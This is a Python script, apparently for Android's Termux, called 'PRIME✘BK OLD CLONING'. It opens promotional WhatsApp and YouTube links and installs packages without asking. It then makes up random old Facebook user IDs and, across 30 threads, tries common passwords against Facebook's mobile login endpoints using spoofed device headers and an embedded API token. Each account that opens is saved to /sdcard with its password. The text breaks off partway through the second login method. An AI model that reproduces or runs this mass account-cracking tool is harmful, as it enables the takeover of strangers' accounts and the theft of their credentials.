import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
import platform
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime
import os
import time
import os
import time
import sys
import subprocess


import os, time

# WhatsApp Channel Section
channel_link = "https://whatsapp.com/channel/0029VbDkME44o7qHmGe0dm1f"
group_link = "https://chat.whatsapp.com/BFRIRZNi4mLAlcKljM8PAG"
os.system(f"echo '{group_link}' | termux-clipboard-set 2>/dev/null")
print(" \x1b[1;32m[+] WhatsApp Group Link Copied to Clipboard!")
print(" \x1b[1;36m[*] Opening WhatsApp Group...")

# 1. Try opening directly in WhatsApp App using Intent
wa_gp = f"am start -a android.intent.action.VIEW -d '{group_link}' >/dev/null 2>&1 || termux-open-url '{group_link}'"
os.system(wa_gp)

time.sleep(5)

os.system(f"echo '{channel_link}' | termux-clipboard-set 2>/dev/null")
print(" \x1b[1;32m[+] WhatsApp Channel Link Copied to Clipboard!")
print(" \x1b[1;36m[*] Opening WhatsApp Channel...")

# 1. Try opening directly in WhatsApp App using Intent
wa_ch = f"am start -a android.intent.action.VIEW -d '{channel_link}' >/dev/null 2>&1 || termux-open-url '{channel_link}'"
os.system(wa_ch)


# Exactly 5 seconds wait for WhatsApp
time.sleep(5)
# YouTube Channel
yt_link = "https://www.youtube.com/@bk_on_fire_69"

print(" \x1b[1;32m[+] Opening YouTube Channel... Please Subscribe!")

# Open YouTube directly
yt_ch = f"am start -a android.intent.action.VIEW -d '{yt_link}' >/dev/null 2>&1 || termux-open-url '{yt_link}'"
os.system(yt_ch)

time.sleep(2)

os.system('clear')

import os
import sys
import time
import platform
import urllib.parse
import random
import string
from datetime import datetime, timedelta

# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module} > /dev/null 2>&1')

import requests
from requests.exceptions import ConnectionError

requests.urllib3.disable_warnings()

# --- Configuration ---
TEST_MODE = True
TEST_START_DATE = datetime(2026, 10, 20)
TEST_EXPIRY_DATE = datetime(2026, 11, 25)

def calculate_time_left(expiry_str):
    if not expiry_str or expiry_str == "Lifetime":
        return "Lifetime Access"

    try:
        if len(expiry_str) > 10:
            exp_dt = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M")
        else:
            exp_dt = datetime.strptime(expiry_str, "%Y-%m-%d")

        now = datetime.now()
        diff = exp_dt - now
        total_seconds = diff.total_seconds()

        if total_seconds <= 0:
            return "Expired"

        total_hours = int(total_seconds // 3600)
        minutes = int((total_seconds % 3600) // 60)

        if total_hours < 24:
            return f"{total_hours}h {minutes}m Left"
        else:
            days = total_hours // 24
            rem_hours = total_hours % 24
            return f"{days}d {rem_hours}h {minutes}m Left"

    except Exception:
        return expiry_str
        
        
def check_test_access():
    if not TEST_MODE:
        return False

    now = datetime.now()

    if TEST_START_DATE <= now < TEST_EXPIRY_DATE:
        return True

    return False

def get_test_countdown():
    now = datetime.now()
    diff = TEST_EXPIRY_DATE - now

    total_seconds = int(diff.total_seconds())

    if total_seconds <= 0:
        return "EXPIRED"

    days = total_seconds // 86400
    hours = (total_seconds % 86400) // 3600
    minutes = (total_seconds % 3600) // 60

    return f"{days}D {hours}H {minutes}M LEFT"
    

def check_key():

    if TEST_MODE:

        # --------------------------------------------------------
        # TEST ACCESS ACTIVE
        # --------------------------------------------------------
        if check_test_access():
            test_name = "TEST USER"
            test_key = "TEST-KEY-0001"
            test_expiry = "2026-11-25"

            os.system("clear")

            logo = """██████╗ ██████╗ ██╗███╗   ███╗███████╗    ██████╗ ██╗  ██╗
██╔══██╗██╔══██╗██║████╗ ████║██╔════╝    ██╔══██╗██║ ██╔╝
██████╔╝██████╔╝██║██╔████╔██║█████╗      ██████╔╝█████╔╝
██╔═══╝ ██╔══██╗██║██║╚██╔╝██║██╔══╝      ██╔══██╗██╔═██╗
██║     ██║  ██║██║██║ ╚═╝ ██║███████╗    ██████╔╝██║  ██╗
╚═╝     ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝FREEE""".strip("\n")

            colors = [
                (255, 0, 0),
                (255, 140, 0),
                (255, 255, 0),
                (0, 255, 80),
                (0, 255, 255),
                (255, 0, 255),
                (180, 0, 255),
            ]

            letter_ranges = [
                (0, 7),
                (8, 15),
                (16, 19),
                (19, 30),
                (30, 38),
                (42, 49),
                (50, 58),
            ]

            output = []

            for line in logo.splitlines():
                colored_line = ""

                for x, char in enumerate(line):
                    letter_index = None

                    for i, (start, end) in enumerate(letter_ranges):
                        if start <= x < end:
                            letter_index = i
                            break

                    if letter_index is None or char == " ":
                        colored_line += char
                        continue

                    r, g, b = colors[letter_index]

                    colored_line += (
                        f"\033[1;38;2;{r};{g};{b}m{char}"
                    )

                colored_line += "\033[0m"
                output.append(colored_line)

            print("\n".join(output))

            print(
                "\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                "━━━━━━━━━━━━━━━━━━━━\033[0m"
            )
            print("\033[1;32m[✓] TEST ACCESS ACTIVE\033[0m")
            print(f"\033[1;97m[✓] USER NAME    : {test_name}")
            print(f"[✓] LICENSE KEY  : {test_key}")
            print("[✓] ACCESS       : FREEE")
            print("[✓] EXPIRES      : 25 NOVEMBER 2026")
            print(
                "\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                "━━━━━━━━━━━━━━━━━━━━\033[0m"
            )

            time.sleep(1)

            return test_name, test_key, test_expiry

        # --------------------------------------------------------
        # TEST ACCESS EXPIRED
        # --------------------------------------------------------
        else:
            os.system("clear")

            logo = """██████╗ ██████╗ ██╗███╗   ███╗███████╗    ██████╗ ██╗  ██╗
██╔══██╗██╔══██╗██║████╗ ████║██╔════╝    ██╔══██╗██║ ██╔╝
██████╔╝██████╔╝██║██╔████╔██║█████╗      ██████╔╝█████╔╝
██╔═══╝ ██╔══██╗██║██║╚██╔╝██║██╔══╝      ██╔══██╗██╔═██╗
██║     ██║  ██║██║██║ ╚═╝ ██║███████╗    ██████╔╝██║  ██╗
╚═╝     ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝FREEE""".strip("\n")

            colors = [
                (255, 0, 0),
                (255, 140, 0),
                (255, 255, 0),
                (0, 255, 80),
                (0, 255, 255),
                (255, 0, 255),
                (180, 0, 255),
            ]

            letter_ranges = [
                (0, 7),
                (8, 15),
                (16, 19),
                (19, 30),
                (30, 38),
                (42, 49),
                (50, 58),
            ]

            output = []

            for line in logo.splitlines():
                colored_line = ""

                for x, char in enumerate(line):
                    letter_index = None

                    for i, (start, end) in enumerate(letter_ranges):
                        if start <= x < end:
                            letter_index = i
                            break

                    if letter_index is None or char == " ":
                        colored_line += char
                        continue

                    r, g, b = colors[letter_index]

                    colored_line += (
                        f"\033[1;38;2;{r};{g};{b}m{char}"
                    )

                colored_line += "\033[0m"
                output.append(colored_line)

            print("\n".join(output))

            print(
                "\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                "━━━━━━━━━━━━━━━━━━━━\033[0m"
            )
            print("\033[1;31m[×] ACCESS DENIED\033[0m")
            print(
                "\033[1;97mYour 30-day testing access has expired.\033[0m"
            )
            print(
                "\033[1;97mTest access ended on: 29 October 2026\033[0m"
            )
            print(
                "\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                "━━━━━━━━━━━━━━━━━━━━\033[0m"
            )

            sys.exit(1)

def display_welcome_banner(user_name, user_key, time_left):
    print(f"\r\033[1;33m[⏳] Strating Tool, Please wait!\033[0m")
    time.sleep(6)
    os.system('clear')


if __name__ == '__main__':
    result = check_key()
    if result:
        user_name, user_key, expiry_str = result
        remaining_time = calculate_time_left(expiry_str)
        display_welcome_banner(user_name, user_key, remaining_time)
        
# Initial setup and promotion
os.system('clear')
print(' \x1b[38;5;46mPRIME✘BK SERVER LOADING....')

try:
    import requests
except ImportError:
    print('\033[38;5;46m[\033[1;97m✓\033[38;5;46m] INSTALLING REQUESTS ')
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])

try:
    import chardet
except ImportError:
    print('\033[38;5;46m[\033[1;97m✓\033[38;5;46m] INSTALLING CHARDET ')
    subprocess.check_call([sys.executable, "-m", "pip", "install", "chardet"])

try:
    import urllib3
except ImportError:
    print('\033[38;5;46m[\033[1;97m✓\033[38;5;46m] INSTALLING URLLIB3 ')
    subprocess.check_call([sys.executable, "-m", "pip", "install", "urllib3"])

try:
    import idna
except ImportError:
    print('\033[38;5;46m[\033[1;97m✓\033[38;5;46m] INSTALLING IDNA ')
    subprocess.check_call([sys.executable, "-m", "pip", "install", "idna"])

try:
    import certifi
except ImportError:
    print('\033[38;5;46m[\033[1;97m✓\033[38;5;46m] INSTALLING CERTIFI ')
    subprocess.check_call([sys.executable, "-m", "pip", "install", "certifi"])

try:
    import httpx
except ImportError:
    print('\033[38;5;46m[\033[1;97m✓\033[38;5;46m] INSTALLING HTTPX ')
    subprocess.check_call([sys.executable, "-m", "pip", "install", "httpx"])

try:
    from bs4 import BeautifulSoup
except ImportError:
    print('\033[38;5;46m[\033[1;97m✓\033[38;5;46m] INSTALLING BEAUTIFULSOUP4 ')
    subprocess.check_call([sys.executable, "-m", "pip", "install", "beautifulsoup4"])
    
os.system('clear')


# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

# Color codes for terminal output
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'


def windows():
    A = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/156.0.0.0 Safari/537.36"
    )

    B = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/155.0.0.0 Safari/537.36"
    )

    C = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/154.0.0.0 Safari/537.36"
    )

    D = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/153.0.0.0 Safari/537.36"
    )

    return random.choice([A, B, C, D])


def window1():
    A = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/157.0.0.0 Safari/537.36"
    )

    B = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/156.0.0.0 Safari/537.36"
    )

    C = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/155.0.0.0 Safari/537.36"
    )

    D = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/154.0.0.0 Safari/537.36"
    )

    return random.choice([A, B, C, D])
    
# Set window title
sys.stdout.write('\x1b]2;𓆩【PRIME✘BK 👑 】𓆪 \x07')
# ==========================================
# 👑 REAL BRANDING BANNER (SCREENSHOT STYLE) 👑
# ==========================================
def show_branding():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')

    logo = """██████╗ ██████╗ ██╗███╗   ███╗███████╗    ██████╗ ██╗  ██╗
██╔══██╗██╔══██╗██║████╗ ████║██╔════╝    ██╔══██╗██║ ██╔╝
██████╔╝██████╔╝██║██╔████╔██║█████╗      ██████╔╝█████╔╝ 
██╔═══╝ ██╔══██╗██║██║╚██╔╝██║██╔══╝      ██╔══██╗██╔═██╗ 
██║     ██║  ██║██║██║ ╚═╝ ██║███████╗    ██████╔╝██║  ██╗
╚═╝     ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝""".strip("\n")

    # P      R        I        M         E        B        K
    colors = [
        (255, 0, 0),        # P - Bright Red
        (255, 140, 0),      # R - Bright Orange
        (255, 255, 0),      # I - Bright Yellow
        (0, 255, 80),       # M - Bright Green
        (0, 255, 255),      # E - Bright Cyan
        (255, 0, 255),      # B - Bright Magenta/Pink
        (180, 0, 255),      # K - Bright Purple
    ]

    # Exact ranges for PRIME BK
    letter_ranges = [
        (0, 7),     # P
        (8, 15),    # R
        (16, 19),   # I
        (19, 30),   # M
        (30, 38),   # E
        (42, 49),   # B
        (50, 58),   # K
    ]

    output = []
    lines = logo.splitlines()

    for line_no, line in enumerate(lines):
        colored_line = ""

        for x, char in enumerate(line):
            letter_index = None

            for i, (start, end) in enumerate(letter_ranges):
                if start <= x < end:
                    letter_index = i
                    break

            # Keep spaces/separators completely untouched
            if letter_index is None or char == " ":
                colored_line += char
                continue

            r, g, b = colors[letter_index]
            colored_line += f"\033[1;38;2;{r};{g};{b}m{char}"

        # Keep the extra FREEE text at the end of the logo, exactly as requested.
        if line_no == len(lines) - 1:
            colored_line += "FREEE"

        colored_line += "\033[0m"
        output.append(colored_line)

    print("\n".join(output))
    print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;95mOWNER      \x1b[38;5;46m▶  \033[1;97mMR BIJOY")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;95mGITHUB     \x1b[38;5;46m▶  \033[1;97mBIJOY-CYBER-404")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;95mWHATSAP    \x1b[38;5;46m▶  \033[1;97m01605081296")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;95mFEATURE    \x1b[38;5;46m▶  \033[1;97mOLD CLONING")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;95mSTATUS     \x1b[38;5;46m▶  \033[1;97mFREEE")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;95mVERSION    \x1b[38;5;46m▶  \033[1;97m2.0")
    print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")

def ____banner____():
    show_branding()


# پرانے بینر کو اس نئے طریقے پر سیٹ کر دیا تاکہ نیچے پورا اسکرپٹ خود ہی فکس ہو جائے
def ____banner____():
    show_branding()



def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'): return '2009'
        if uid.startswith('100000000'): return '2009'
        if uid.startswith('10000000'): return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')): return '2010'
        if uid.startswith('100001'): return '2010'
        if uid.startswith(('100002', '100003')): return '2011'
        if uid.startswith('100004'): return '2012'
        if uid.startswith(('100005', '100006')): return '2013'
        if uid.startswith(('100007', '100008')): return '2014'
        if uid.startswith('100009'): return '2015'
        if uid.startswith('10001'): return '2016'
        if uid.startswith('10002'): return '2017'
        if uid.startswith('10003'): return '2018'
        if uid.startswith('10004'): return '2019'
        if uid.startswith('10005'): return '2020'
        if uid.startswith('10006'): return '2021'
        if uid.startswith('10009'): return '2023'
        if uid.startswith(('10007', '10008')): return '2022'
        return ''
    elif len(uid) in (9, 10): return '2008'
    elif len(uid) == 8: return '2007'
    elif len(uid) == 7: return '2006'
    elif len(uid) == 14 and uid.startswith('61'): return '2024'
    else: return ''


def clear():
    os.system('clear')


def linex():
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def BNG_71_():
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;33mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mOLD CLONE')
    linex()
    __Jihad__ = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE  {W}: {Y}")
    if __Jihad__ in ('A', 'a', '01', '1'):
        old_clone()
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()


def old_clone():
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;32mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;51mALL SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;32mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;51m100003/4 SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;32mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;51m2009 series')
    linex()
    _input = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE  {W}: {Y}")
    if _input in ('A', 'a', '01', '1'):
        old_One()
    elif _input in ('B', 'b', '02', '2'):
        old_Tow()
    elif _input in ('C', 'c', '03', '3'):
        old_Tree()
    else:
        print(f"\n[×]{rad} Choose Value Option... ")
        BNG_71_()


def old_One():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mOld Code {Y}:{G} 2010-2014")
    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def old_Tow():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD B')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def old_Tree():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMethod B')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mPRIME✘BK-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mPRIME✘BK\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;97m{creationyear(uid)}")
                open('/sdcard/PRIME X BK-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mPRIME✘BK\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;97m{creationyear(uid)}")
                open('/sdcard/PRIME X BK-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)


def login_2(uid):
    global loop
    session = requests.session()
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mPRIME✘BK-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
